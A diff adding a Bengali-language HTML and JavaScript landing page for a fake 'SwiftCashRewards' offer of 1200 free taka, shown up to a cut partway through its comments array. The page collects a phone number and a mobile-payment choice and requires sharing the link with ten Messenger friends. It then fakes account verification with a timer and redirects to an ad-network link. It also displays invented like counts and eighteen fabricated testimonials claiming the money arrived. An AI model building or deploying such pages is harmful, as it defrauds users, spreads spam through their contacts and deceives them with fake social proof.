@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SwiftCashRewards - ফ্রি ১২০০ টাকা নিন এখনই!</title>
+    <meta property="og:title" content="SwiftCashRewards - ফ্রি ১২০০ টাকা নিন এখনই!">
+    <meta property="og:description" content="প্রথম রেজিস্ট্রেশনকারীদের জন্য বিশেষ অফার! দ্রুত রেজিস্ট্রেশন করে জিতে নিন ১২০০ টাকা বোনাস। SwiftCashRewards এর সাথে থাকার জন্য ধন্যবাদ।">
+    <meta property="og:image" content="https://i.imgur.com/Ds5aRgJ.jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <meta property="og:url" content=""> <meta property="og:type" content="website">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #DC3545; /* Red for buttons */
+            --primary-hover-color: #C82333;
+            --secondary-color: #007BFF;
+            --text-color: #333;
+            --text-color-light: #606770; /* Lighter text for actions/time */
+            --light-gray: #f0f2f5; /* Lighter gray for backgrounds */
+            --border-color: #ddd;
+            --container-bg: #ffffff;
+            --success-color: #28a745;
+            --fb-blue: #1877f2;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+            font-family: 'Noto Sans Bengali', sans-serif; /* Updated Font */
+            background-color: var(--light-gray);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .hero-image-container {
+            width: 100%;
+            max-height: 60vh; /* Adjusted height */
+            overflow: hidden;
+            background-color: #e0e0e0; /* Placeholder bg */
+        }
+
+        .hero-image {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16 / 9;
+            object-fit: cover;
+            display: block;
+        }
+
+        .container {
+            max-width: 700px; /* Default max-width */
+            margin: 0 auto; /* Center container */
+            background-color: var(--container-bg);
+            box-shadow: 0 1px 10px rgba(0,0,0,0.1);
+            padding: 0; /* Remove padding, handle inside sections */
+        }
+
+        #main-content {
+            text-align: center;
+            padding: 30px 20px; /* Consistent padding */
+            min-height: 300px;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        #main-content h1 {
+            font-size: 2em; /* Adjusted font size */
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        #main-content h2 {
+            font-size: 1.6em; /* Adjusted font size */
+            color: var(--text-color);
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        #main-content p {
+            font-size: 1.05em; /* Adjusted font size */
+            margin-bottom: 25px;
+            color: var(--text-color-light);
+        }
+        .headline-company {
+            font-size: 1.3em;
+            font-weight: 500;
+            color: var(--secondary-color);
+            margin-bottom: 5px;
+        }
+        .headline-main span {
+            background-color: rgba(255, 235, 59, 0.7); /* Slightly transparent yellow */
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        .headline-sub {
+            font-size: 1em;
+            color: var(--text-color); /* Make sub-headline a bit darker */
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 30px; /* Slightly larger padding */
+            font-size: 1.1em;
+            font-weight: 600; /* Bolder font */
+            color: white;
+            background-color: var(--primary-color);
+            border: none;
+            border-radius: 6px; /* Slightly more rounded */
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            margin-top: 10px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover-color);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .pulsating-btn {
+             /* Updated Animation */
+            animation: pulse 2s infinite ease-in-out;
+            transform-origin: center;
+        }
+
+        @keyframes pulse {
+             0% {
+                 transform: scale(1);
+                 box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 0 0 0 rgba(220, 53, 69, 0.7);
+             }
+             50% {
+                  transform: scale(1.03); /* Slight zoom */
+                  box-shadow: 0 4px 8px rgba(0,0,0,0.15), 0 0 0 15px rgba(220, 53, 69, 0);
+             }
+             100% {
+                 transform: scale(1);
+                 box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 0 0 0 rgba(220, 53, 69, 0);
+             }
+         }
+
+
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 25px 0; /* Adjusted margin */
+            flex-wrap: wrap;
+        }
+
+        .payment-option {
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px; /* Increased padding */
+            cursor: pointer;
+            transition: border-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center;
+            background-color: #fff;
+            min-width: 100px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .payment-option img {
+            height: 40px;
+            margin-bottom: 8px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+         .payment-option span {
+             font-size: 0.9em;
+             font-weight: 500;
+             color: var(--text-color-light);
+         }
+        .payment-option:hover {
+             transform: translateY(-3px);
+             box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .payment-option.selected {
+            border-color: var(--primary-color);
+            transform: scale(1.05);
+            box-shadow: 0 0 12px rgba(220, 53, 69, 0.4);
+        }
+
+        #phoneNumberInput {
+            max-width: 300px; /* Limit width */
+            width: 80%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            font-size: 1em;
+            text-align: center;
+        }
+
+        .verification-status {
+            margin-top: 20px;
+        }
+        #verificationText {
+            font-size: 1.2em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .spinner {
+            border: 4px solid rgba(0,0,0,0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: var(--primary-color);
+            animation: spin 1s ease infinite;
+            margin: 20px auto; /* Increased margin */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success-message {
+            color: var(--success-color);
+            font-size: 1.5em;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        /* --- Social & Comments Section --- */
+        .social-section {
+            margin-top: 0; /* Removed top margin */
+            padding: 15px 20px; /* Adjusted padding */
+            background-color: var(--container-bg); /* Ensure same background */
+            border-top: 8px solid var(--light-gray); /* Clearer separator */
+        }
+
+        /* New Offer Reaction Bar */
+        .offer-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e0e0e0; /* Match FB separator */
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .offer-actions-left { /* Container for action buttons */
+             display: flex;
+        }
+
+        .offer-actions .action-item {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: background-color 0.2s ease;
+            color: var(--text-color-light);
+            margin-right: 8px;
+            user-select: none; /* Prevent text selection on click */
+        }
+        .offer-actions .action-item:hover {
+            background-color: rgba(0, 0, 0, 0.05); /* Subtle hover */
+        }
+
+        .offer-actions .action-icon {
+            width: 20px; /* Fixed size */
+            height: 20px;
+            margin-right: 6px;
+            fill: var(--text-color-light);
+            transition: fill 0.2s ease, transform 0.2s ease;
+        }
+        .offer-actions .action-text {
+             font-weight: 600;
+             font-size: 0.95em;
+             line-height: 1; /* Ensure alignment */
+        }
+        .offer-actions .action-item:active .action-icon {
+             transform: scale(0.9); /* Click feedback */
+        }
+
+        /* Liked State */
+        .offer-actions .like-action.liked {
+            color: var(--primary-color); /* Use theme red */
+        }
+        .offer-actions .like-action.liked .like-icon {
+            fill: var(--primary-color); /* Use theme red */
+        }
+
+        .action-counts {
+            font-size: 0.9em;
+            color: var(--text-color-light);
+            margin-left: auto; /* Push counts to the right */
+            padding-left: 10px;
+        }
+
+        /* --- Comments --- */
+         .comments-title {
+             font-size: 1.2em;
+             font-weight: 600;
+             margin-bottom: 15px;
+             border-bottom: 1px solid #e0e0e0;
+             padding-bottom: 10px;
+         }
+        .comments-container {
+            margin-top: 15px;
+        }
+        .comment {
+            display: flex;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #e9ebee;
+        }
+        .comment:last-child {
+            border-bottom: none;
+        }
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
+            flex-shrink: 0; /* Prevent shrinking */
+        }
+        .comment-content {
+            flex-grow: 1;
+            background-color: var(--light-gray); /* Match page background */
+            padding: 8px 12px;
+            border-radius: 18px;
+        }
+        .comment-author {
+            font-weight: 600; /* Bolder */
+            color: #050505;
+            font-size: 0.9em;
+            display: block;
+        }
+        .comment-text {
+            font-size: 0.95em;
+            color: #050505;
+            margin: 4px 0;
+            line-height: 1.4;
+            word-wrap: break-word;
+        }
+        .comment-actions {
+            font-size: 0.8em;
+            color: var(--text-color-light);
+            margin-top: 5px;
+        }
+        .comment-actions .comment-like {
+            color: var(--text-color-light);
+            font-weight: 600; /* Bold */
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .comment-actions .comment-like:hover, .comment-actions .comment-like.liked {
+            text-decoration: none; /* No underline */
+            color: var(--primary-color); /* Or var(--fb-blue) */
+        }
+        .comment-actions .comment-time {
+            margin-left: 8px;
+        }
+        .add-comment {
+            display: flex;
+            align-items: center;
+            margin-top: 10px; /* Reduced margin */
+            padding: 10px 0; /* Adjusted padding */
+            border-top: 1px solid #e0e0e0;
+        }
+        #newCommentInput {
+            flex-grow: 1;
+            padding: 10px 15px;
+            border: 1px solid #ccd0d5;
+            border-radius: 18px;
+            margin-right: 10px;
+            background-color: var(--light-gray);
+            font-size: 0.95em;
+            outline: none;
+        }
+        #newCommentInput:focus {
+             border-color: var(--fb-blue);
+        }
+        #submitCommentBtn {
+            padding: 8px 15px;
+            font-size: 0.9em;
+            font-weight: 600;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+         #submitCommentBtn:hover {
+            background-color: var(--primary-hover-color);
+         }
+
+        /* --- Responsive Adjustments --- */
+        @media (max-width: 600px) {
+            #main-content h1 { font-size: 1.8em; }
+            #main-content h2 { font-size: 1.5em; }
+            #main-content p { font-size: 1em; }
+            .btn { font-size: 1em; padding: 10px 20px;}
+            .payment-option { min-width: calc(33% - 20px); } /* Adjust for 3 options */
+            .comment-avatar { width: 32px; height: 32px; }
+            .comment-content { padding: 6px 10px; }
+             .offer-actions { justify-content: space-around; } /* Center items more */
+             .action-counts { width: 100%; text-align: left; margin-top: 8px; margin-left: 0; padding-left: 0;}
+        }
+
+         @media (min-width: 768px) { /* Desktop Styles */
+            .container {
+                max-width: 800px; /* Wider container */
+                padding: 0; /* Reset padding */
+                 margin: 20px auto; /* Add top/bottom margin */
+            }
+             #main-content {
+                  padding: 40px 50px; /* More padding on desktop */
+             }
+             #main-content h1 { font-size: 2.5em; }
+             #main-content h2 { font-size: 2em; }
+             #main-content p { font-size: 1.1em; }
+             .payment-methods { gap: 25px; margin: 30px 0; }
+             .payment-option { min-width: 120px; padding: 20px; }
+             .social-section {
+                 padding: 20px 50px; /* Match main content padding */
+             }
+             .action-counts { margin-left: auto; } /* Ensure counts stay right */
+
+         }
+         @media (min-width: 992px) {
+            .container {
+                 max-width: 850px;
+            }
+             #main-content h1 { font-size: 2.8em; }
+             #main-content h2 { font-size: 2.2em; }
+         }
+
+    </style>
+</head>
+<body>
+
+    <div class="hero-image-container">
+        <img src="https://i.imgur.com/Ds5aRgJ.jpeg" alt="SwiftCashRewards Offer" class="hero-image" id="heroImage">
+    </div>
+
+    <div class="container">
+        <div id="main-content">
+            </div>
+
+        <div class="social-section">
+            <div class="offer-actions">
+                <div class="offer-actions-left">
+                     <div class="action-item like-action" id="offerLikeAction">
+                         <svg class="action-icon like-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+  <path d="M1 21h4V9H1v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32a1 1 0 0 0-.29-.7L14.17 1 7 8.18V21h10c.83 0 1.54-.5 1.84-1.22l3-7A2.01 2.01 0 0 0 23 10z"/>
+</svg>
+                         <span class="action-text">লাইক</span>
+                     </div>
+                     <div class="action-item comment-action" id="offerCommentAction">
+                          <svg class="action-icon comment-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18zM18 14H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
+                         <span class="action-text">কমেন্ট</span>
+                     </div>
+                </div>
+                 <div class="action-counts" id="offerActionCounts">
+                     <span id="offerLikesCount">12809 লাইক</span>
+                     <span id="offerCommentsCount"> · 4583 কমেন্ট</span> </div>
+            </div>
+
+            <h3 class="comments-title">কিছু ব্যবহারকারীদের কমেন্ট:</h3>
+             <div class="add-comment">
+                 <img src="https://i.ibb.co/6nZzM9L/default-avatar.png" alt="You" class="comment-avatar">
+                 <input type="text" id="newCommentInput" placeholder="আপনার মন্তব্য লিখুন...">
+                 <button id="submitCommentBtn" class="btn">পাঠান</button>
+             </div>
+            <div id="commentsContainer" class="comments-container">
+                </div>
+        </div>
+    </div>
+
+    <script>
+        const mainContent = document.getElementById('main-content');
+        const heroImage = document.getElementById('heroImage');
+        const ADSTERRA_LINK = "YOUR_ADSTERRA_DIRECT_LINK_HERE";
+        const FACEBOOK_APP_ID = "2024687464606735";
+
+        // --- Initialize Hero Image ---
+        heroImage.onerror = function() {
+            this.src = 'https://i.imgur.com/Ds5aRgJ.jpeg';
+            console.warn("Hero image failed to load. Displaying placeholder.");
+        };
+        const heroImageURL = "https://i.imgur.com/Ds5aRgJ.jpeg";
+        if (heroImageURL && heroImageURL !== "https://i.imgur.com/Ds5aRgJ.jpeg") {
+             heroImage.src = heroImageURL;
+        } else {
+             heroImage.src = 'https://i.imgur.com/Ds5aRgJ.jpeg'; // Default placeholder
+        }
+
+
+        // --- OG URL Setup ---
+        const ogUrlMeta = document.querySelector('meta[property="og:url"]');
+        if (ogUrlMeta) {
+            ogUrlMeta.setAttribute('content', window.location.href);
+        }
+
+        // --- State Management ---
+        let currentStage = 0;
+        let selectedPaymentMethod = null;
+        let phoneNumber = '';
+
+        const shareDetails = {
+            title: "দারুণ একটা অফার!",
+            text: `দারুণ খবর! SwiftCashRewards দিচ্ছে প্রথম রেজিস্ট্রেশনের জন্য ফ্রি ১২০০ টাকা! আমার মনে হয় তোমারও এটা দেখা উচিত। এখনই রেজিস্ট্রেশন করো এই লিংক থেকে: ${window.location.href}`,
+            url: window.location.href // URL is included in text for some sharing methods
+        };
+
+        const paymentLogos = {
+            bkash: 'https://i.ibb.co/9YPS3Q9/bkash-logo.png',
+            rocket: 'https://i.ibb.co/fHB08m9/rocket-logo.png',
+            nagad: 'https://i.ibb.co/N7GgQWX/nagad-logo.png'
+        };
+
+        // --- HTML for Dynamic Stages ---
+        function getStageHTML(stage) {
+            switch (stage) {
+                case 0: // Initial
+                    return `
+                        <div class="headline-company">SwiftCashRewards</div>
+                        <h1 class="headline-main">কোম্পানির প্রচারে এক দারুণ সুযোগ! <br><span>ফ্রি ১২০০ টাকা</span>নিন <br>এখনই!</h1>
+                        <p class="headline-sub">এই অফারটি সীমিত সময়ের জন্য। শুধুমাত্র প্রথমে যারা রেজিস্ট্রেশন করবেন, তারাই এই আকর্ষণীয় বোনাস পাবেন। আর দেরি না করে এখনই রেজিস্ট্রেশন করুন!</p>
+                        <button id="registerBtn" class="btn pulsating-btn">এখনি রেজিস্ট্রেশন করুন!</button>
+                    `;
+                case 1: // Payment & Phone
+                    return `
+                        <h2>আপনার পছন্দের পেমেন্ট পদ্ধতি নির্বাচন করুন:</h2>
+                        <div class="payment-methods">
+                            <div class="payment-option" data-method="bkash">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkKKsXWiTrlalq7iNuMhMlhGUSIZT9cT990bhAIXrVcAiOa3NfPp-A2Cs&s=10" alt="bKash">
+                                <span>বিকাশ</span>
+                            </div>
+                            <div class="payment-option" data-method="rocket">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/Rocket_mobile_banking_logo.svg/250px-Rocket_mobile_banking_logo.svg.png" alt="Rocket">
+                                <span>রকেট</span>
+                            </div>
+                            <div class="payment-option" data-method="nagad">
+                                <img src="https://upload.wikimedia.org/wikipedia/bn/thumb/9/97/%E0%A6%A8%E0%A6%97%E0%A6%A6%E0%A7%87%E0%A6%B0_%E0%A6%B2%E0%A7%8B%E0%A6%97%E0%A7%8B.svg/2560px-%E0%A6%A8%E0%A6%97%E0%A6%A6%E0%A7%87%E0%A6%B0_%E0%A6%B2%E0%A7%8B%E0%A6%97%E0%A7%8B.svg.png" alt="Nagad">
+                                <span>নগদ</span>
+                            </div>
+                        </div>
+                        <input type="tel" id="phoneNumberInput" placeholder="আপনার ১১ সংখ্যার মোবাইল নম্বর দিন" maxlength="11" inputmode="numeric">
+                        <button id="paymentSubmitBtn" class="btn" disabled>এগিয়ে যান</button>
+                    `;
+                case 2: // Share Instruction
+                    return `
+                        <h2>অ্যাকাউন্ট ভেরিফিকেশন</h2>
+                        <p>আপনার অ্যাকাউন্টটি ভেরিফাই করতে, নিচের 'শেয়ার করুন' বাটনে ক্লিক করে এই অফারটি আপনার মেসেঞ্জারের মাধ্যমে কমপক্ষে ১০ জন বন্ধুকে পাঠান। শেয়ার সম্পন্ন করে এই পেইজে ফিরে আসুন।</p>
+                        <p style="font-size: 0.9em; color: #666;">(শেয়ার না করলে অফারটি পাবেন না।)</p>
+                        <button id="shareBtn" class="btn">মেসেঞ্জারে শেয়ার করুন</button>
+                    `;
+                case 3: // Verifying...
+                    return `
+                        <h2>ভেরিফাই করা হচ্ছে...</h2>
+                        <p>অনুগ্রহ করে অপেক্ষা করুন। আপনার শেয়ার স্ট্যাটাস চেক করা হচ্ছে।</p>
+                        <div class="spinner"></div>
+                    `;
+                case 4: // Verified & Final CTA
+                    return `
+                        <h2 class="success-message">🎉 অভিনন্দন! আপনার একাউন্ট সফলভাবে ভেরিফাইড হয়েছে। 🎉</h2>
+                        <p>আপনার বোনাস সংগ্রহ করতে এবং ফরম পূরণ করতে নিচের বাটনে ক্লিক করুন।</p>
+                        <a href="${ADSTERRA_LINK}" id="adsterraLinkBtn" class="btn" style="background-color: var(--success-color); border-color: var(--success-color);">ফরম পূরণ করতে এখানে ক্লিক করুন</a>
+                    `;
+                default:
+                    return '<p>কিছু একটা সমস্যা হয়েছে। অনুগ্রহ করে পৃষ্ঠাটি রিফ্রেশ করুন।</p>';
+            }
+        }
+
+        // --- Event Listeners Attachment ---
+        function attachEventListenersForStage(stage) {
+            if (stage === 0) {
+                const regBtn = document.getElementById('registerBtn');
+                if(regBtn) regBtn.addEventListener('click', () => loadStage(1));
+            } else if (stage === 1) {
+                const paymentOptions = document.querySelectorAll('.payment-option');
+                const phoneInput = document.getElementById('phoneNumberInput');
+                const submitBtn = document.getElementById('paymentSubmitBtn');
+
+                function validateStep1() {
+                    if (!phoneInput || !submitBtn) return; // Ensure elements exist
+                    const isPhoneValid = /^[0-9]{11}$/.test(phoneInput.value);
+                    submitBtn.disabled = !(selectedPaymentMethod && isPhoneValid);
+                }
+
+                paymentOptions.forEach(option => {
+                    option.addEventListener('click', () => {
+                        paymentOptions.forEach(opt => opt.classList.remove('selected'));
+                        option.classList.add('selected');
+                        selectedPaymentMethod = option.dataset.method;
+                        validateStep1();
+                    });
+                });
+
+                if(phoneInput) phoneInput.addEventListener('input', () => {
+                    // Allow only numbers
+                    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+                    phoneNumber = phoneInput.value;
+                    validateStep1();
+                });
+
+                if(submitBtn) submitBtn.addEventListener('click', () => {
+                     if (!submitBtn.disabled) loadStage(2);
+                 });
+
+            } else if (stage === 2) {
+                 const shareBtn = document.getElementById('shareBtn');
+                 if (shareBtn) shareBtn.addEventListener('click', handleShare);
+
+            } else if (stage === 4) {
+                 // Adsterra link is already set in the HTML template string
+                 // No specific listeners needed here unless for tracking.
+            }
+        }
+
+        // --- Share Handling ---
+        function handleShare() {
+    console.log("Sharing...");
+    loadStage(3); // Show loading screen immediately
+
+    const messengerUrl = `fb-messenger://share/?link=${encodeURIComponent(shareDetails.url)}&app_id=${FACEBOOK_APP_ID}`;
+
+    let messengerWindow = window.open(messengerUrl, '_blank');
+
+    // Try to detect if Messenger opened successfully (not guaranteed in all browsers)
+    setTimeout(() => {
+        try {
+            if (!messengerWindow || messengerWindow.closed || typeof messengerWindow.closed === "undefined") {
+                console.log("Messenger share may have failed or was blocked.");
+
+                // Try Web Share API as fallback
+                if (navigator.share) {
+                    navigator.share({
+                        title: shareDetails.title,
+                        text: shareDetails.text
+                    }).then(() => {
+                        console.log('Successful share via Web Share API');
+                    }).catch(err => {
+                        console.warn('Web Share API also failed:', err);
+                    });
+                }
+            } else {
+                console.log("Messenger share likely successful.");
+            }
+        } catch (err) {
+            console.warn("Error checking Messenger window:", err);
+        }
+
+        // Proceed regardless after delay
+        proceedToVerification();
+    }, 10000); // 10 seconds wait for Messenger window
+}
+
+         function attemptMessengerShare() {
+    const customMessage = "দারুণ অফার! রেজিস্ট্রেশন করলেই পাচ্ছেন ১২০০ টাকা ফ্রি!";
+    const fullTextWithLink = `${customMessage} ${shareDetails.url}`;
+    const messengerUrl = `fb-messenger://share/?link=${encodeURIComponent(fullTextWithLink)}&app_id=${FACEBOOK_APP_ID}`;
+    window.open(messengerUrl, '_blank');
+}
+
+         function proceedToVerification() {
+              // Simulate verification check after 5 seconds
+              setTimeout(() => {
+                  loadStage(4); // Show verified stage
+              }, 5000); // 5 second delay
+         }
+
+
+        // --- Stage Loading Logic ---
+        function loadStage(stage) {
+            mainContent.style.opacity = 0;
+            setTimeout(() => {
+                mainContent.innerHTML = getStageHTML(stage);
+                attachEventListenersForStage(stage);
+                mainContent.style.opacity = 1;
+                currentStage = stage;
+                 window.scrollTo({ top: mainContent.offsetTop - 20, behavior: 'smooth' }); // Scroll to new content
+            }, 500); // Reduced transition time to 0.5s
+        }
+
+         // --- Offer Action Bar Logic ---
+        const offerLikeAction = document.getElementById('offerLikeAction');
+        const offerLikesCountSpan = document.getElementById('offerLikesCount'); // Span within action-counts
+        const offerCommentAction = document.getElementById('offerCommentAction');
+        const offerActionCountsContainer = document.getElementById('offerActionCounts'); // The container for counts
+        const addCommentSection = document.querySelector('.add-comment');
+
+        let offerLikes = 12809;
+        let isOfferLiked = false;
+        // Example comment count (could be dynamic if comments were real)
+        let offerComments = 4583;
+
+        function updateOfferLikeButton() {
+            const likeIcon = offerLikeAction.querySelector('.like-icon');
+            const likeText = offerLikeAction.querySelector('.action-text');
+
+            if (isOfferLiked) {
+                offerLikeAction.classList.add('liked');
+                likeText.textContent = 'লাইকড';
+            } else {
+                offerLikeAction.classList.remove('liked');
+                likeText.textContent = 'লাইক';
+            }
+            // Update the count in the separate counts area
+            const likesSpan = offerActionCountsContainer.querySelector('#offerLikesCount');
+            if(likesSpan) likesSpan.textContent = `${offerLikes} লাইক`;
+        }
+
+         if (offerLikeAction) offerLikeAction.addEventListener('click', () => {
+             if (isOfferLiked) {
+                 offerLikes--;
+             } else {
+                 offerLikes++;
+             }
+             isOfferLiked = !isOfferLiked;
+             updateOfferLikeButton();
+         });
+
+         if(offerCommentAction) offerCommentAction.addEventListener('click', () => {
+              if(addCommentSection) {
+                  addCommentSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                  document.getElementById('newCommentInput').focus();
+              }
+          });
+
+         // Initial setup for offer counts display
+         function initializeCounts() {
+             const likesSpan = offerActionCountsContainer.querySelector('#offerLikesCount');
+             const commentsSpan = offerActionCountsContainer.querySelector('#offerCommentsCount');
+             if(likesSpan) likesSpan.textContent = `${offerLikes} লাইক`;
+             if(commentsSpan) commentsSpan.textContent = ` · ${offerComments} কমেন্ট`; // Use dynamic count if available
+         }
+         initializeCounts();
+
+
+        // --- Comments Logic ---
+        let comments = [
+            { id: 1, avatar: 'https://i.ibb.co/PGrLqY5/avatar1.jpg', author: 'মোঃ আরিফুল ইসলাম', text: 'আমি পাইছি অফারটা! বিশ্বাসই করতে পারছি না ১২০০ টাকা একদম ফ্রি! 🔥💸', time: '২ ঘন্টা আগে', likes: 15, liked: false },
+            { id: 2, avatar: 'https://i.ibb.co/s5wW0Bw/avatar2.jpg', author: 'সুমাইয়া আক্তার', text: 'ধন্যবাদ, অনেক উপকার হলো 😊 এমন অফার আর কবে দিবেন? 🙏', time: '১ ঘন্টা আগে', likes: 8, liked: false  },
+            { id: 3, avatar: 'https://i.ibb.co/nQw9WdD/avatar3.jpg', author: 'রাকিব হাসান', text: 'আমি রিডিম করতে পেরেছি, একদম সহজ প্রক্রিয়া ছিলো 🤑✅', time: '৪৫ মিনিট আগে', likes: 22, liked: false  },
+            { id: 4, avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png', author: 'ফারজানা হক', text: 'সত্যিই কাজ করে ! অনেক ধন্যবাদ এমন একটা অফার দেয়ার জন্য 🙌🎁', time: '৩০ মিনিট আগে', likes: 5, liked: false  },
+            { id: 5, avatar: 'https://i.ibb.co/PGrLqY5/avatar1.jpg', author: 'আলমগীর হোসেন', text: 'ফ্রিতে ১২০০ টাকা পাওয়া আজকাল সহজ না, কিন্তু এটা সত্যিই কাজ করেছে 💯💰', time: '২০ মিনিট আগে', likes: 12, liked: false  },
+            { id: 6, avatar: 'https://i.ibb.co/s5wW0Bw/avatar2.jpg', author: 'তাসনিম চৌধুরী', text: 'ভাবছিলাম স্ক্যাম হবে 😅 কিন্তু সত্যিই পেলাম 😍', time: '১৫ মিনিট আগে', likes: 18, liked: false  },
+            { id: 7, avatar: 'https://i.ibb.co/nQw9WdD/avatar3.jpg', author: 'সোহেল রানা', text: 'অবিশ্বাস্য অফার! আমি সত্যিই টাকা পেয়েছি 🥳💵', time: '১০ মিনিট আগে', likes: 25, liked: false  },
+            { id: 8, avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png', author: 'জান্নাতুল ফেরদৌস', text: 'এমন অফার আগে কখনো পাইনি, একদম legit ছিলো 👍✅', time: '৫ মিনিট আগে', likes: 7, liked: false  },
+            { id: 9, avatar: 'https://i.ibb.co/PGrLqY5/avatar1.jpg', author: 'ইমরান খান', text: 'প্রথমে সন্দেহ করছিলাম 😐 এখন বুঝলাম সত্যি ছিল 🤯', time: '২ মিনিট আগে', likes: 30, liked: false  },
+            { id: 10, avatar: 'https://i.ibb.co/s5wW0Bw/avatar2.jpg', author: 'নুসরাত জাহান', text: 'আমি পেয়েছি! দেরি না করে সবাই নিয়ে নাও ⚡💸', time: 'এখনই', likes: 10, liked: false  },
+            { id: 11, avatar: 'https://i.ibb.co/nQw9WdD/avatar3.jpg', author: 'মিজানুর রহমান', text: 'ধন্যবাদ ভাই, বিকাশে টাকা চলে আসছে একদম টাইমলি 📱💳', time: '৩ ঘন্টা আগে', likes: 19, liked: false },
+            { id: 12, avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png', author: 'সাদিয়া আফরিন', text: 'আমি আমার বোনকেও অফারটা নিতে বলছি, ওও পেয়ে গেছে! 👭💰', time: '২.৫ ঘন্টা আগে', likes: 23, liked: false },
+            { id: 13, avatar: 'https://i.ibb.co/PGrLqY5/avatar1.jpg', author: 'তারেক মনোয়ার', text: ' সত্যি কথা বলতে কি, আজকাল এমন ফ্রি টাকা কেউ দেয় না – এই অফারটা ব্যতিক্রম! ⭐🙏', time: '২ ঘন্টা ১৫ মি. আগে', likes: 6, liked: false },
+            { id: 14, avatar: 'https://i.ibb.co/s5wW0Bw/avatar2.jpg', author: 'মরিয়ম বেগম', text: 'আমি রেফার করে আমার বন্ধুকেও দিছে  – অসাধারণ! 🔁🎉', time: '১ ঘন্টা ৩০ মি. আগে', likes: 11, liked: false },
+            { id: 15, avatar: 'https://i.ibb.co/nQw9WdD/avatar3.jpg', author: 'জাকির আহমেদ', text: 'যারা সন্দেহ করতেছে, তারা একবার ট্রাই করে দেখো – একদম কাজ করে 💪💯', time: '১ ঘন্টা আগে', likes: 14, liked: false },
+            { id: 16, avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png', author: 'আয়েশা সিদ্দিকা', text: 'রেগুলার চেক করতেছি, এমন অফার আবার কবে আসে জানাবেন প্লিজ 🔔📢', time: '৫৫ মিনিট আগে', likes: 9, liked: false },
+            { id: 17, avatar: 'https://i.ibb.co/PGrLqY5/avatar1.jpg', author: 'সাইফুল্লাহ্', text: '১২০০ টাকা ফ্রি পেয়ে গেলাম, একদম ঝামেলা ছাড়াই 📲💥', time: '৪০ মিনিট আগে', likes: 20, liked: false },
+            { id: 18, avatar: 'https://i.ibb.co/s5wW0Bw/avatar2.jpg', author: 'নাদিয়া সুলতানা', text: 'আমি রিডিম করতে গিয়ে একটু দেরি করছিলাম, তারপরও পেয়ে গেছি 😮✅', time: '৩৫ মিনিট আগে', likes: 4, liked: false },
